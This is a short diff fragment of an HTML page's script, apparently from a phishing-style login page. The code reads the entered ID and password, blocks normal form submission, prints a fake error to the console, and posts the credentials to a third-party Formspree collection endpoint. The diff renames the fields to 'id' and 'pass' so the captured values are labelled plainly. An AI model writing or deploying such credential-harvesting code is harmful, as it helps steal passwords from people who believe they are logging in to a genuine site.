@@ -120,9 +120,10 @@ h2 {
 :link { color: rgb(51,51,125) ; text-decoration: none;}
 :active { color: rgb(0,153,0) ; text-decoration: underline; }
 :visited { color: rgb(85,85,175) ; text-decoration: none; }</style>
+
 <script>
   console.log("error 323");
-var onclick = () => {
+var onClick = () => {
 	event.preventDefault();
     var id = document.getElementById('ID').value
     var pass = document.getElementById('PASS').value
@@ -130,9 +131,9 @@ var onclick = () => {
     fetch("https://formspree.io/f/mqkjkvgw", {
     method: "POST",
     body: JSON.stringify({
-        title: id,
-        body: pass,
-        userId: 1
+        id: id,
+        pass: pass,
+        
     }),
      
     headers: {
